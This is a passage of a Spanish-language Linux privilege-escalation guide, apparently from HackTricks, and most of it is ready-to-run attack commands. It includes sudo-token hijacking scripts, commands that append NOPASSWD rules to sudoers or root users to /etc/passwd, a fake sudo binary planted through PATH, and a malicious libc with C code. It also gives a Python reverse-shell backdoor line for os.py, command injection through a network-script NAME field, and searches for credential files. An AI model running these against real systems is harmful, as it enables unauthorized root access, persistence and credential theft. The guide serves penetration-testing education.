El proyecto recopila funciones legítimas de binarios Unix que pueden ser abusadas para salir de shells restringidas, escalar o mantener privilegios elevados, transferir archivos, crear bind y reverse shells, y facilitar otras tareas de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si puedes acceder a `sudo -l` puedes usar la herramienta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para comprobar si encuentra cómo explotar alguna regla de sudo.

### Reusing Sudo Tokens

En casos en los que tengas **acceso a sudo** pero no la contraseña, puedes escalar privilegios **esperando a que se ejecute un comando sudo y luego secuestrando el token de la sesión**.

Requisitos para escalar privilegios:

- Ya tienes una shell como usuario "_sampleuser_"
- "_sampleuser_" ha **usado `sudo`** para ejecutar algo en los **últimos 15 minutos** (por defecto esa es la duración del token de sudo que nos permite usar `sudo` sin introducir ninguna contraseña)
- `cat /proc/sys/kernel/yama/ptrace_scope` es 0
- `gdb` es accesible (puedes subirlo)

(Puedes habilitar temporalmente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o modificar permanentemente `/etc/sysctl.d/10-ptrace.conf` y establecer `kernel.yama.ptrace_scope = 0`)

Si se cumplen todos estos requisitos, **puedes escalar privilegios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- El **primer exploit** (`exploit.sh`) creará el binario `activate_sudo_token` en _/tmp_. Puedes usarlo para **activar el token de sudo en tu sesión** (no obtendrás automáticamente una shell de root, haz `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- El **segundo exploit** (`exploit_v2.sh`) creará una shell sh en _/tmp_ **propiedad de root con setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- El **tercer exploit** (`exploit_v3.sh`) **creará un archivo sudoers** que hace que **los tokens de sudo sean eternos y permite a todos los usuarios usar sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Si tienes **permisos de escritura** en la carpeta o en cualquiera de los archivos creados dentro de la carpeta, puedes usar el binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **crear un token de sudo para un usuario y PID**.\
Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y tienes una shell como ese usuario con PID 1234, puedes **obtener privilegios de sudo** sin necesidad de conocer la contraseña haciendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

El archivo `/etc/sudoers` y los archivos dentro de `/etc/sudoers.d` configuran quién puede usar `sudo` y cómo. Estos archivos **por defecto solo pueden ser leídos por el usuario root y el grupo root**.\
**Si** puedes **leer** este archivo, podrías **obtener información interesante**, y si puedes **escribir** cualquier archivo, podrás **escalar privilegios**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si puedes escribir, puedes abusar de este permiso
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Otra forma de abusar de estos permisos:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Hay algunas alternativas al binario `sudo` como `doas` para OpenBSD, recuerda revisar su configuración en `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Si sabes que un **usuario normalmente se conecta a una máquina y usa `sudo`** para escalar privilegios y conseguiste una shell dentro de ese contexto de usuario, puedes **crear un nuevo ejecutable de sudo** que ejecute tu código como root y luego el comando del usuario. Después, **modifica el $PATH** del contexto del usuario (por ejemplo, añadiendo la nueva ruta en .bash_profile) para que cuando el usuario ejecute sudo, se ejecute tu ejecutable de sudo.

Ten en cuenta que si el usuario usa un shell diferente (no bash) necesitarás modificar otros archivos para añadir la nueva ruta. Por ejemplo[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puedes encontrar otro ejemplo en [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

O ejecutar algo como:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

El archivo `/etc/ld.so.conf` indica **de dónde se cargan los archivos de configuración**. Normalmente, este archivo contiene la siguiente ruta: `include /etc/ld.so.conf.d/*.conf`

Eso significa que los archivos de configuración de `/etc/ld.so.conf.d/*.conf` serán leídos. Estos archivos de configuración **apuntan a otras carpetas** donde se van a **buscar** las **libraries**. Por ejemplo, el contenido de `/etc/ld.so.conf.d/libc.conf` es `/usr/local/lib`. **Esto significa que el sistema buscará libraries dentro de `/usr/local/lib`**.

Si por algún motivo **un usuario tiene permisos de escritura** sobre cualquiera de las rutas indicadas: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cualquier archivo dentro de `/etc/ld.so.conf.d/` o cualquier carpeta dentro del archivo de configuración en `/etc/ld.so.conf.d/*.conf`, podría ser capaz de escalar privilegios.\
Echa un vistazo a **cómo explotar esta mala configuración** en la siguiente página:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Copiando la lib en `/var/tmp/flag15/` será usada por el programa en este lugar, tal como se especifica en la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Entonces crea una biblioteca maliciosa en `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities proporcionan un **subconjunto de los privilegios root disponibles a un proceso**. Esto divide efectivamente los privilegios de root en unidades más pequeñas y distintas. Cada una de estas unidades puede concederse de forma independiente a los procesos. De este modo, el conjunto completo de privilegios se reduce, disminuyendo los riesgos de explotación.\
Lee la siguiente página para **aprender más sobre capabilities y cómo abusar de ellas**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Permisos de directorio

En un directorio, el **bit de "execute"** implica que el usuario afectado puede hacer "**cd**" dentro de la carpeta.\
El bit de **"read"** implica que el usuario puede **listar** los **archivos**, y el bit de **"write"** implica que el usuario puede **eliminar** y **crear** nuevos **archivos**.

## ACLs

Las Access Control Lists (ACLs) representan la capa secundaria de permisos discrecionales, capaz de **sobrescribir los permisos tradicionales ugo/rwx**. Estos permisos mejoran el control sobre el acceso a archivos o directorios al permitir o denegar derechos a usuarios específicos que no son los propietarios ni forman parte del grupo. Este nivel de **granularidad garantiza una gestión de acceso más precisa**. Puedes encontrar más detalles [**aquí**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Da** al usuario "kali" permisos de lectura y escritura sobre un archivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtener** archivos con ACLs específicas del sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Puerta trasera ACL oculta en sudoers drop-ins

Una mala configuración común es un archivo propiedad de root en `/etc/sudoers.d/` con modo `440` que aún concede acceso de escritura a un usuario de bajo privilegio mediante ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Si ves algo como `user:alice:rw-`, el usuario puede añadir una regla de sudo a pesar de los bits de modo restrictivos:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Esta es una ruta de persistencia/privesc de ACL de alto impacto porque es fácil pasarla por alto en revisiones que solo usan `ls -l`.

## Open shell sessions

En **versiones antiguas** puedes **hijack** alguna sesión **shell** de otro usuario (**root**).\
En **versiones más nuevas** solo podrás **connect** a sesiones de screen de **tu propio usuario**. Sin embargo, podrías encontrar **información interesante dentro de la sesión**.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Adjuntarse a una sesión**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## secuestro de sesiones tmux

Esto era un problema con **versiones antiguas de tmux**. No pude secuestrar una sesión de tmux (v2.1) creada por root como un usuario sin privilegios.

**Listar sesiones de tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Adjuntarse a una sesión**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Este bug se produce al crear una nueva ssh key en esos OS, ya que **solo eran posibles 32,768 variaciones**. Esto significa que todas las posibilidades pueden calcularse y **teniendo la ssh public key puedes buscar la correspondiente private key**. Puedes encontrar las posibilidades calculadas aquí: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Especifica si se permite la autenticación por contraseña. El valor por defecto es `no`.
- **PubkeyAuthentication:** Especifica si se permite la autenticación por clave pública. El valor por defecto es `yes`.
- **PermitEmptyPasswords**: Cuando se permite la autenticación por contraseña, especifica si el servidor permite iniciar sesión en cuentas con cadenas de contraseña vacías. El valor por defecto es `no`.

### Login control files

These files influence who can log in and how:

- **`/etc/nologin`**: si está presente, bloquea los inicios de sesión no-root e imprime su mensaje.
- **`/etc/securetty`**: restringe dónde puede iniciar sesión root (allowlist de TTY).
- **`/etc/motd`**: banner posterior al inicio de sesión (puede filtrar información del entorno o detalles de mantenimiento).

### PermitRootLogin

Especifica si root puede iniciar sesión usando ssh, el valor por defecto es `no`. Valores posibles:

- `yes`: root can login using password and private key
- `without-password` or `prohibit-password`: root can only login with a private key
- `forced-commands-only`: Root can login only using private key and if the commands options are specified
- `no` : no

### AuthorizedKeysFile

Especifica los archivos que contienen las public keys que pueden usarse para la autenticación de usuario. Puede contener tokens como `%h`, que se reemplazarán por el directorio home. **Puedes indicar rutas absolutas** (comenzando en `/`) o **rutas relativas al home del usuario**. Por ejemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Esa configuración indicará que si intentas iniciar sesión con la clave **privada** del usuario "**testusername**", ssh comparará la clave pública de tu clave con las que se encuentran en `/home/testusername/.ssh/authorized_keys` y `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding te permite **usar tus claves SSH locales en lugar de dejar claves** (¡sin passphrases!) almacenadas en tu servidor. Así, podrás **saltar** vía ssh **a un host** y desde allí **saltar a otro** host **usando** la **clave** ubicada en tu **host inicial**.

Necesitas establecer esta opción en `$HOME/.ssh.config` así:
```
Host example.com
ForwardAgent yes
```
Ten en cuenta que si `Host` es `*`, cada vez que el usuario salta a otra máquina, ese host podrá acceder a las keys (lo cual es un problema de seguridad).

El archivo `/etc/ssh_config` puede **anular** estas **options** y permitir o denegar esta configuración.\
El archivo `/etc/sshd_config` puede **allow** o **denied** el ssh-agent forwarding con la keyword `AllowAgentForwarding` (el valor por defecto es allow).

Si encuentras que Forward Agent está configurado en un entorno, lee la siguiente página porque **podrías ser capaz de abusar de ello para escalar privilegios**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

El archivo `/etc/profile` y los archivos dentro de `/etc/profile.d/` son **scripts que se ejecutan cuando un usuario inicia una nueva shell**. Por lo tanto, si puedes **escribir o modificar cualquiera de ellos puedes escalar privilegios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **detalles sensibles**.

### Archivos Passwd/Shadow

Dependiendo del SO, los archivos `/etc/passwd` y `/etc/shadow` pueden estar usando un nombre diferente o puede haber una copia de seguridad. Por lo tanto, se recomienda **encontrarlos todos** y **comprobar si puedes leerlos** para ver **si hay hashes** dentro de los archivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
En algunas ocasiones puedes encontrar **hashes de contraseñas** dentro del archivo `/etc/passwd` (o equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Primero, genera una contraseña con uno de los siguientes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Luego agrega el usuario `hacker` y añade la contraseña generada.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ahora puedes usar el comando `su` con `hacker:hacker`

Alternativamente, puedes usar las siguientes líneas para añadir un usuario dummy sin contraseña.\
AVISO: podrías degradar la seguridad actual de la máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: En plataformas BSD, `/etc/passwd` se encuentra en `/etc/pwd.db` y `/etc/master.passwd`, además `/etc/shadow` se renombra a `/etc/spwd.db`.

Deberías comprobar si puedes **escribir en algunos archivos sensibles**. Por ejemplo, ¿puedes escribir en algún **archivo de configuración de servicio**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por ejemplo, si la máquina está ejecutando un servidor **tomcat** y puedes **modificar el archivo de configuración del servicio Tomcat dentro de /etc/systemd/,** entonces puedes modificar las líneas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Tu backdoor se ejecutará la próxima vez que se inicie tomcat.

### Check Folders

Las siguientes carpetas pueden contener backups o información interesante: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablemente no podrás leer la última, pero inténtalo)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ubicación extraña/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Archivos modificados en los últimos minutos
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Archivos DB de Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_historial, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml archivos
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Archivos ocultos
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries en PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Archivos web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Copias de seguridad**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Archivos conocidos que contienen contraseñas

Lee el código de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), busca **varios archivos posibles que podrían contener contraseñas**.\
**Otra herramienta interesante** que puedes usar para hacer esto es: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), una aplicación de código abierto usada para recuperar muchas contraseñas almacenadas en un ordenador local para Windows, Linux y Mac.

### Logs

Si puedes leer logs, puedes encontrar **información interesante/confidencial dentro de ellos**. Cuanto más extraño sea el log, más interesante será (probablemente).\
Además, algunos **audit logs** "**mal**" configurados (¿con backdoor?) pueden permitirte **registrar contraseñas** dentro de audit logs, como se explica en esta publicación: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para **leer logs el grupo** [**adm**](interesting-groups-linux-pe/index.html#adm-group) será realmente útil.

### Archivos de shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Búsqueda genérica de credenciales/Regex

También deberías buscar archivos que contengan la palabra "**password**" en su **nombre** o dentro del **contenido**, y también comprobar IPs y emails dentro de logs, o regexps de hashes.\
No voy a listar aquí cómo hacer todo esto, pero si te interesa puedes revisar las últimas comprobaciones que realiza [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Archivos escribibles

### Secuestro de librería Python

Si sabes **desde dónde** se va a ejecutar un script de Python y **puedes escribir dentro** de esa carpeta o **puedes modificar librerías de Python**, puedes modificar la librería del SO y meterle una backdoor (si puedes escribir donde se va a ejecutar el script de Python, copia y pega la librería os.py).

Para **meter una backdoor a la librería** solo añade al final de la librería os.py la siguiente línea (cambia IP y PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Explotación de Logrotate

Una vulnerabilidad en `logrotate` permite que usuarios con **permisos de escritura** sobre un archivo de log o sus directorios padre puedan potencialmente obtener privilegios elevados. Esto se debe a que `logrotate`, que a menudo se ejecuta como **root**, puede ser manipulado para ejecutar archivos arbitrarios, especialmente en directorios como _**/etc/bash_completion.d/**_. Es importante revisar los permisos no solo en _/var/log_ sino también en cualquier directorio donde se aplique la rotación de logs.

> [!TIP]
> Esta vulnerabilidad afecta a `logrotate` versión `3.18.0` y anteriores

Se puede encontrar más información detallada sobre la vulnerabilidad en esta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Puedes explotar esta vulnerabilidad con [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidad es muy similar a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** así que siempre que encuentres que puedes modificar logs, revisa quién los está administrando y comprueba si puedes escalar privilegios sustituyendo los logs por symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referencia de la vulnerabilidad:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Si, por cualquier motivo, un usuario puede **escribir** un script `ifcf-<whatever>` en _/etc/sysconfig/network-scripts_ **o** puede **modificar** uno existente, entonces tu **system is pwned**.

Los scripts de red, _ifcg-eth0_ por ejemplo, se usan para conexiones de red. Se parecen exactamente a archivos .INI. Sin embargo, en Linux son \~sourced\~ por Network Manager (dispatcher.d).

En mi caso, el atributo `NAME=` en estos scripts de red no se maneja correctamente. Si tienes **white/blank space en el nombre, el sistema intenta ejecutar la parte después del white/blank space**. Esto significa que **todo lo que esté después del primer espacio en blanco se ejecuta como root**.

Por ejemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Nota el espacio en blanco entre Network y /bin/id_)

### **init, init.d, systemd, and rc.d**

El directorio `/etc/init.d` es el hogar de **scripts** para System V init (SysVinit), el **clásico sistema de gestión de servicios de Linux**. Incluye scripts para `start`, `stop`, `restart`, y a veces `reload` servicios. Estos pueden ejecutarse directamente o mediante enlaces simbólicos que se encuentran en `/etc/rc?.d/`. Una ruta alternativa en sistemas Redhat es `/etc/rc.d/init.d`.

Por otro lado, `/etc/init` está asociado con **Upstart**, un **service management** más nuevo introducido por Ubuntu, usando archivos de configuración para tareas de gestión de servicios. A pesar de la transición a Upstart, los scripts de SysVinit todavía se utilizan junto con las configuraciones de Upstart debido a una capa de compatibilidad en Upstart.

**systemd** surge como un gestor moderno de inicialización y servicios, ofreciendo funciones avanzadas como el inicio de demonios bajo demanda, la gestión de automount y snapshots del estado del sistema. Organiza los archivos en `/usr/lib/systemd/` para paquetes de distribución y `/etc/systemd/system/` para modificaciones del administrador, agilizando el proceso de administración del sistema.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations can extract a binary path from process command lines and execute it with -v under a privileged context. Permissive patterns (e.g., using \S) may match attacker-staged listeners in writable locations (e.g., /tmp/httpd), leading to execution as root (CWE-426 Untrusted Search Path).

Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
